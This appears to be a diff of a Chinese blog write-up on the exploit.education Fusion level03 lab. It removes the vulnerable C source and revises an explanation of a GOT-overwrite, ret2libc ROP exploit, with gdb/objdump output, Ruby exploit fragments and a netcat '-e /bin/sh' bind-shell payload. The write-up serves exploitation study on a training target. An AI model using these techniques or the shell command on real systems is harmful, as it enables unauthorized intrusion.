-</span></span><span class="line"><span class="cl">          <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">json_object_array_length</span><span class="p">(</span><span class="n">val</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">              <span class="n">json_object</span> <span class="o">*</span><span class="n">obj</span> <span class="o">=</span> <span class="n">json_object_array_get_idx</span><span class="p">(</span><span class="n">val</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">              <span class="n">tags</span><span class="p">[</span><span class="n">tag_cnt</span> <span class="o">+</span> <span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">json_object_get_string</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">          <span class="p">}</span>
-</span></span><span class="line"><span class="cl">          <span class="n">tag_cnt</span> <span class="o">+=</span> <span class="n">i</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">      <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="s">&#34;title&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">          <span class="n">len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">title</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">          <span class="n">decode_string</span><span class="p">(</span><span class="n">json_object_get_string</span><span class="p">(</span><span class="n">val</span><span class="p">),</span> <span class="n">title</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">          <span class="n">gTitle</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="n">len</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">          <span class="n">gTitle_len</span> <span class="o">=</span> <span class="n">len</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">          <span class="n">memcpy</span><span class="p">(</span><span class="n">gTitle</span><span class="p">,</span> <span class="n">title</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">      <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="s">&#34;contents&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">          <span class="n">len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">contents</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">          <span class="n">decode_string</span><span class="p">(</span><span class="n">json_object_get_string</span><span class="p">(</span><span class="n">val</span><span class="p">),</span> <span class="n">contents</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">          <span class="n">gContents</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="n">len</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">          <span class="n">gContents_len</span> <span class="o">=</span> <span class="n">len</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">          <span class="n">memcpy</span><span class="p">(</span><span class="n">gContents</span><span class="p">,</span> <span class="n">contents</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">      <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="s">&#34;serverip&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">          <span class="n">gServerIP</span> <span class="o">=</span> <span class="n">json_object_get_string</span><span class="p">(</span><span class="n">val</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">      <span class="p">}</span>
-</span></span><span class="line"><span class="cl">  <span class="p">}</span>
-</span></span><span class="line"><span class="cl">  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;and done!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">post_blog_article</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">port</span> <span class="o">=</span> <span class="s">&#34;80&#34;</span><span class="p">,</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">  <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">sin</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">len</span><span class="p">,</span> <span class="n">cl</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">post</span><span class="p">,</span> <span class="o">*</span><span class="n">data</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="c1">// We can&#39;t post if there is no information available
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="o">!</span> <span class="n">gServerIP</span> <span class="o">||</span> <span class="o">!</span><span class="n">gContents</span> <span class="o">||</span> <span class="o">!</span><span class="n">gTitle</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="n">post</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="mi">128</span> <span class="o">*</span> <span class="mi">1024</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="n">cl</span> <span class="o">=</span> <span class="n">gTitle_len</span> <span class="o">+</span> <span class="n">gContents_len</span> <span class="o">+</span> <span class="n">strlen</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\r\n\r\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="n">len</span> <span class="o">=</span> <span class="n">sprintf</span><span class="p">(</span><span class="n">post</span><span class="p">,</span> <span class="s">&#34;POST /blog/post HTTP/1.1</span><span class="se">\r\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="n">len</span> <span class="o">+=</span> <span class="n">sprintf</span><span class="p">(</span><span class="n">post</span> <span class="o">+</span> <span class="n">len</span><span class="p">,</span> <span class="s">&#34;Connection: close</span><span class="se">\r\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="n">len</span> <span class="o">+=</span> <span class="n">sprintf</span><span class="p">(</span><span class="n">post</span> <span class="o">+</span> <span class="n">len</span><span class="p">,</span> <span class="s">&#34;Host: %s</span><span class="se">\r\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">gServerIP</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="n">len</span> <span class="o">+=</span> <span class="n">sprintf</span><span class="p">(</span><span class="n">post</span> <span class="o">+</span> <span class="n">len</span><span class="p">,</span> <span class="s">&#34;Content-Length: %d</span><span class="se">\r\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">cl</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="n">len</span> <span class="o">+=</span> <span class="n">sprintf</span><span class="p">(</span><span class="n">post</span> <span class="o">+</span> <span class="n">len</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\r\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="n">memcpy</span><span class="p">(</span><span class="n">post</span> <span class="o">+</span> <span class="n">len</span><span class="p">,</span> <span class="n">gTitle</span><span class="p">,</span> <span class="n">gTitle_len</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="n">len</span> <span class="o">+=</span> <span class="n">gTitle_len</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">  <span class="n">len</span> <span class="o">+=</span> <span class="n">sprintf</span><span class="p">(</span><span class="n">post</span> <span class="o">+</span> <span class="n">len</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\r\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="n">memcpy</span><span class="p">(</span><span class="n">post</span> <span class="o">+</span> <span class="n">len</span><span class="p">,</span> <span class="n">gContents</span><span class="p">,</span> <span class="n">gContents_len</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="n">len</span> <span class="o">+=</span> <span class="n">gContents_len</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="n">p</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">gServerIP</span><span class="p">,</span> <span class="sc">&#39;:&#39;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">      <span class="o">*</span><span class="n">p</span><span class="o">++</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">      <span class="n">port</span> <span class="o">=</span> <span class="n">p</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">  <span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">));</span>
-</span></span><span class="line"><span class="cl">  <span class="n">sin</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">  <span class="n">sin</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span><span class="n">gServerIP</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="n">sin</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">atoi</span><span class="p">(</span><span class="n">port</span><span class="p">));</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="n">fd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="n">err</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">,</span> <span class="s">&#34;socket(): &#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="n">connect</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">sin</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">      <span class="n">err</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">,</span> <span class="s">&#34;connect(): &#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="n">nwrite</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">post</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="n">signal</span><span class="p">(</span><span class="n">SIGPIPE</span><span class="p">,</span> <span class="n">SIG_IGN</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="n">background_process</span><span class="p">(</span><span class="n">NAME</span><span class="p">,</span> <span class="n">UID</span><span class="p">,</span> <span class="n">GID</span><span class="p">);</span> 
-</span></span><span class="line"><span class="cl">  <span class="n">fd</span> <span class="o">=</span> <span class="n">serve_forever</span><span class="p">(</span><span class="n">PORT</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="n">set_io</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="n">send_token</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">  <span class="n">read_request</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">  <span class="n">validate_request</span><span class="p">();</span>   
-</span></span><span class="line"><span class="cl">  <span class="n">parse_request</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">  <span class="n">handle_request</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">  <span class="n">post_blog_article</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div><hr>
+<p><a class="link" href="https://exploit.education/fusion/level03/"  target="_blank" rel="noopener"
+    >☞ 太长所以还是放源网页吧</a></p>
+<hr>
 <h2 id="overview">Overview</h2>
-<p>它&hellip;它实在是太长了（</p>
 <p>总之这个程序想做的事情<em>大致</em>是：</p>
 <ol>
 <li>用户用 socket 连上去，发一个 json；</li>
@@ -886,7 +628,7 @@ if (!doNotTrack) {
 <p>（python 的 pwntools 里就有这个方法 <code>pwnlib.util.cyclic</code></p>
 <p>（但是我想用 ruby x</p>
 <hr>
-<h2 id="find-out-rop-chain">Find Out ROP chain</h2>
+<h2 id="find-out-rop-chain">Find Out ROP Chain</h2>
 <p>按照前面说过的，我们的目的是执行 ret2libc 执行 system 函数</p>
 <p>但是由于程序里并没有用过 system，所以动态链接表里是没这个的地址的</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">fusion@fusion:~$ objdump -t /opt/fusion/bin/level03 <span class="p">|</span> grep system
@@ -987,6 +729,7 @@ if (!doNotTrack) {
 </span></span><span class="line"><span class="cl"><span class="vg">$6</span> <span class="o">=</span> <span class="p">{</span><span class="o">&lt;</span><span class="n">text</span> <span class="n">variable</span><span class="p">,</span> <span class="n">no</span> <span class="n">debug</span> <span class="n">info</span><span class="o">&gt;</span><span class="p">}</span> <span class="mh">0xb73fafc0</span> <span class="o">&lt;</span><span class="n">__srandom</span><span class="o">&gt;</span>
 </span></span></code></pre></div><p><code>0xb7404b20 &lt;__libc_system&gt; - 0xb73fafc0 &lt;__srandom&gt; = 0x9B60</code></p>
 <p>啊 不行，这个偏移的值太小了，那字符串到了 <code>0x00009B60</code> 时会因为 null byte 被提前截断的</p>
+<p><del>（其实后来我发现这题可以用 <code>\u0000</code> 来绕过 nullbyte 的限制x</del></p>
 <p>那就随便换一个（</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="nb">p</span> <span class="nb">system</span>
 </span></span><span class="line"><span class="cl"><span class="vg">$5</span> <span class="o">=</span> <span class="p">{</span><span class="o">&lt;</span><span class="n">text</span> <span class="n">variable</span><span class="p">,</span> <span class="n">no</span> <span class="n">debug</span> <span class="n">info</span><span class="o">&gt;</span><span class="p">}</span> <span class="mh">0xb7404b20</span> <span class="o">&lt;</span><span class="n">__libc_system</span><span class="o">&gt;</span>
@@ -1000,9 +743,9 @@ if (!doNotTrack) {
 <p><code>0x0 - 0x847A0 = 0xFFF7B860</code></p>
 <hr>
 <h3 id="plt-got-gotplt">plt? got? got.plt??</h3>
-<p>注意！</p>
+<p>有个小问题：</p>
 <p>上面几个都是已经链接了之后，再用 gdb 看的地址&hellip;相当于是 libc 里面具体的实现部分</p>
-<p>因为会首 ASLR 影响，所以对我们的 ROP 来说没什么用&hellip;也就是用来算一下偏移量</p>
+<p>因为会受 ASLR 影响，所以对我们的 ROP 来说没什么用&hellip;也就是用来算一下偏移量</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="nb">p</span> <span class="n">write</span>
 </span></span><span class="line"><span class="cl"><span class="vg">$8</span> <span class="o">=</span> <span class="p">{</span><span class="o">&lt;</span><span class="n">text</span> <span class="n">variable</span><span class="p">,</span> <span class="n">no</span> <span class="n">debug</span> <span class="n">info</span><span class="o">&gt;</span><span class="p">}</span> <span class="mh">0xb74892c0</span> <span class="o">&lt;</span><span class="n">write</span><span class="o">&gt;</span>
 </span></span><span class="line"><span class="cl">
@@ -1013,16 +756,22 @@ if (!doNotTrack) {
 </span></span><span class="line"><span class="cl">   <span class="mh">0xb74892cb</span> <span class="o">&lt;</span><span class="n">__write_nocancel</span><span class="o">+</span><span class="mi">1</span><span class="o">&gt;</span><span class="p">:</span>	<span class="n">mov</span>    <span class="mh">0x10</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">),</span><span class="o">%</span><span class="n">edx</span>
 </span></span><span class="line"><span class="cl">   <span class="o">......</span>
 </span></span><span class="line"><span class="cl">   <span class="c1"># 这里都是 libc 的 write 的具体实现</span>
-</span></span></code></pre></div><p>而我们说需要的效果是：call write，却运行了 system</p>
+</span></span></code></pre></div><p>而我们所需要的效果是：call write，却运行了 system</p>
 <p>平常 gdb disas 的时候，我们可以看到这样的句子：</p>
 <p><code>0x0804902f &lt;+31&gt;:	call   0x8048cd0 &lt;signal@plt&gt;</code></p>
 <p>简单理一下 plt 和 got 的关联的话：</p>
+<ul>
+<li>.text 段不可修改，所以在运行时没法直接修改 call 的地址</li>
+<li>所以 elf 就把可以修改的 .got 段用来记录外部函数地址</li>
+<li>但实际上我们都是在 call plt 段；plt 段可以理解为一小块代码，是用来达到「找外部函数地址」的目的</li>
+</ul>
+<p>也就是：</p>
 <ol>
 <li><code>call &lt;write@plt&gt;</code>，于是跳到了 plt</li>
-<li>plt 会看看 got 有没有写上真正的 libc 里的 write 的地址（libc 地址会受 ASLR 影响
-→ 有的话，直接跳到 got 里的记录
-→ 没有的话，就跳 ld.so 来找，然后写进 got
-之后再遇到 <code>call &lt;write@plt&gt;</code> 的话，就可以直接跳 got 记录了</li>
+<li>plt 会看看 got 有没有写上真正的 libc 里的 write 的地址（libc 地址会受 ASLR 影响<br>
+→ 有：直接跳到 got 里的记录<br>
+→ 没有：就跳 ld.so 来找，然后写进 got<br>
+之后再遇到 <code>call &lt;write@plt&gt;</code> 的话，plt 就可以直接跳 got 记录了</li>
 </ol>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="c1"># 这是 got 记录</span>
 </span></span><span class="line"><span class="cl"><span class="n">fusion</span><span class="vi">@fusion</span><span class="ss">:~</span><span class="err">$</span> <span class="n">objdump</span> <span class="o">-</span><span class="n">R</span> <span class="sr">/opt/</span><span class="n">fusion</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">level03</span>
@@ -1035,12 +784,12 @@ if (!doNotTrack) {
 </span></span><span class="line"><span class="cl"><span class="mh">0x804bd1c</span> <span class="o">&lt;</span><span class="n">write</span><span class="vi">@got</span><span class="o">.</span><span class="n">plt</span><span class="o">&gt;</span><span class="p">:</span>	<span class="mh">0xb74892c0</span>
 </span></span></code></pre></div><p>所以我们需要做的，是，把 got 里记录的 <strong>libc 里 write 的具体实现的地址</strong> 改成 <strong>libc 里 system 的具体实现的地址</strong></p>
 <p>总之，write 的 got 记录：<code>0x804bd1c</code></p>
-<p>write 的 plt 地址：</p>
+<p>write 的 plt 地址：<code>0x8048d40</code></p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">fusion</span><span class="vi">@fusion</span><span class="ss">:~</span><span class="err">$</span> <span class="n">objdump</span> <span class="o">-</span><span class="n">d</span> <span class="sr">/opt/</span><span class="n">fusion</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">level03</span> <span class="o">|</span> <span class="n">grep</span> <span class="s2">&#34;write@plt&#34;</span>
 </span></span><span class="line"><span class="cl"><span class="mi">08048</span><span class="n">d40</span> <span class="o">&lt;</span><span class="n">write</span><span class="vi">@plt</span><span class="o">&gt;</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl"> <span class="mi">80495</span><span class="ss">f5</span><span class="p">:</span>	<span class="n">e8</span> <span class="mi">46</span> <span class="n">f7</span> <span class="n">ff</span> <span class="n">ff</span>       	<span class="n">call</span>   <span class="mi">8048</span><span class="n">d40</span> <span class="o">&lt;</span><span class="n">write</span><span class="vi">@plt</span><span class="o">&gt;</span>
 </span></span><span class="line"><span class="cl"> <span class="mi">804</span><span class="ss">a162</span><span class="p">:</span>	<span class="n">e8</span> <span class="n">d9</span> <span class="n">eb</span> <span class="n">ff</span> <span class="n">ff</span>       	<span class="n">call</span>   <span class="mi">8048</span><span class="n">d40</span> <span class="o">&lt;</span><span class="n">write</span><span class="vi">@plt</span><span class="o">&gt;</span>
-</span></span></code></pre></div><p>以及，&ldquo;nc.traditional&hellip;&rdquo; 写在 gContents 里，其地址为：</p>
+</span></span></code></pre></div><p>以及，&ldquo;nc.traditional&hellip;&rdquo; 写在 gContents 里，其地址为：<code>0x0804bdf4</code></p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">fusion</span><span class="vi">@fusion</span><span class="ss">:~</span><span class="err">$</span> <span class="n">objdump</span> <span class="o">-</span><span class="n">t</span> <span class="sr">/opt/</span><span class="n">fusion</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">level03</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">gContents</span>
 </span></span><span class="line"><span class="cl"><span class="mi">0804</span><span class="n">bdec</span> <span class="n">g</span>     <span class="n">O</span> <span class="o">.</span><span class="n">bss</span>	<span class="mo">00000004</span>              <span class="n">gContents_len</span>
 </span></span><span class="line"><span class="cl"><span class="mi">0804</span><span class="n">bdf4</span> <span class="n">g</span>     <span class="n">O</span> <span class="o">.</span><span class="n">bss</span>	<span class="mo">00000004</span>              <span class="n">gContents</span>
@@ -1111,8 +860,8 @@ if (!doNotTrack) {
 </span></span><span class="line"><span class="cl"><span class="n">json</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dup</span><span class="o">.</span><span class="n">sub!</span> <span class="s2">&#34;_replace_&#34;</span><span class="p">,</span> <span class="n">title</span> 
 </span></span><span class="line"><span class="cl"><span class="nb">puts</span> <span class="n">json</span><span class="o">.</span><span class="n">b</span>
 </span></span><span class="line"><span class="cl"><span class="o">......</span>
-</span></span></code></pre></div><p><code>title += '\\\\\uAAAA'</code> 的最终结果是 <code>\\uAAAA</code>（两个反斜杠，一个u，四个A），这纯粹是为了 <code>json_tokener_parse(gRequest)</code> 能解析出正常的东西来</p>
-<p><code>json = json.dup.sub! &quot;_replace_&quot;, title</code> 这一串魔法一样的东西是因为不知道为什么 json 变量被 forze 了，所以只好 dup 一下再 replace</p>
+</span></span></code></pre></div><p><code>title += '\\\\\uAAAA'</code> 的最终结果是 <code>\\\uAAAA</code>（三个反斜杠，一个 u，四个 A），这纯粹是为了 <code>json_tokener_parse(gRequest)</code> 能解析出正常的东西来</p>
+<p><code>json = json.dup.sub! &quot;_replace_&quot;, title</code> 这一串魔法一样的东西，是因为 json 变量被 forze 了，所以只好 duplicate 一下再 replace</p>
 <p>试一下：</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ ./level03.rb
 </span></span><span class="line"><span class="cl"><span class="o">==</span>&gt; Enter hostname:<span class="o">==</span>&gt; received token:
@@ -1130,7 +879,7 @@ if (!doNotTrack) {
 </span></span><span class="line"><span class="cl">Program received signal SIGSEGV, Segmentation fault.
 </span></span><span class="line"><span class="cl">0x44434241 in ?? <span class="o">()</span>
 </span></span></code></pre></div><p>没问题&hellip;能用</p>
-<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=298 height=52 src="//music.163.com/outchain/player?type=2&id=27835539&auto=1&height=32"></iframe>
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=27118629&auto=0&height=66"></iframe>
 <p>绕了这么多路终于快解决了吧..</p>
 <p>然后替换成我们的 ROP Chain：</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">p32</span> <span class="n">addr</span>
@@ -1260,24 +1009,28 @@ if (!doNotTrack) {
 <br>
 <br>
 <br>
-<h2 id="ignore-above-the-real-solution">Ignore Above; The REAL Solution:</h2>
-<p>严格来说，gContents 这个变量，在 .data 段内；</p>
-<p>地址是 <code>0x804bdf4</code>，没开 PIE 所以这个倒是不会变的</p>
+<h2 id="the-true-solution">The TRUE Solution</h2>
+<p>严格来说，gContents 这个变量，在 .bss 段内；</p>
+<blockquote>
+<p>（.bss 和 .data 还是有点区别的）</p>
+<p>BSS refers to uninitialized global and static objects and Data refers to initialized global and static objects.</p>
+</blockquote>
+<p>其地址为 <code>0x804bdf4</code>，没开 PIE 所以这个倒是不会变的</p>
 <p>但是，这个地址里面保存的值，指向了受 ASLR 影响的堆</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span> <span class="mh">0x804bdf4</span>     <span class="c1"># 即 *.data 上指向堆的地址*</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span> <span class="mh">0x804bdf4</span>     <span class="c1"># 即 *.bss 上指向堆的地址*</span>
 </span></span><span class="line"><span class="cl"><span class="mh">0x804bdf4</span> <span class="o">&lt;</span><span class="n">gContents</span><span class="o">&gt;</span><span class="p">:</span>	<span class="mh">0x09b3e710</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">s</span> <span class="mh">0x09b3e710</span>  <span class="c1"># 即 *堆上 gContents 的地址*</span>
 </span></span><span class="line"><span class="cl"><span class="mh">0x9b3e710</span><span class="p">:</span>	 <span class="s2">&#34;/bin/nc.traditional -lp 2333 -e /bin/sh&#34;</span>
-</span></span></code></pre></div><p>我们想要 system 的话，参数写的必须得是 <strong>堆上 gContents 的地址</strong> 而不是 <strong>.data 上指向堆的地址</strong></p>
+</span></span></code></pre></div><p>我们想要 system 的话，参数写的必须得是 <strong>堆上 gContents 的地址</strong> 而不是 <strong>.bss 上指向堆的地址</strong></p>
 <hr>
-<p>我试着谷歌了别人的解法，虽然前面思路都差不多，但是到最后一步的时候他们直接用 <code>&quot;/////////////bin/nc.traditional&quot;</code> 来绕开 ASLR&hellip;.我觉得不行（实际地址有时候 <code>0x99?????</code> 有时候 <code>0x89?????</code>，差了快有 0x10000 了&hellip;.</p>
-<p>我也自己试了很多 ROP chain，都没法用诸如 <code>dword ptr</code> 的指令来把 <strong>.data 上指向堆的地址</strong> 里保存的 <strong>堆上 gContents 的地址</strong> 拿出来</p>
